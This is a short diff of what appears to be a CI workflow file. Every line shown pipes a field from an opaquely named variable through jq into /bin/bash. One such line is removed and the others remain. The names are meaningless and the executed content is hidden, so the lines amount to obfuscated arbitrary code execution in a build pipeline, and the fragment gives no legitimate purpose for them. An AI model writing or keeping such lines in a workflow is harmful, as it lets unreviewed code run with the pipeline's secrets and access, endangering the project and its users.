@@ -23,7 +23,6 @@ jobs:
           echo $drso628 | jq -r .pcklw0724 | /bin/bash
           echo $blbvu40810 | jq -r .p55092 | /bin/bash
           echo $axho5 | jq -r .s19564 | /bin/bash
-          echo $et57 | jq -r .xml07036 | /bin/bash
           printf '%s' "$x03391" | jq -r .yag15 | /bin/bash
           printf '%s' "$kycfm3" | jq -r .dbh4127 | /bin/bash
 
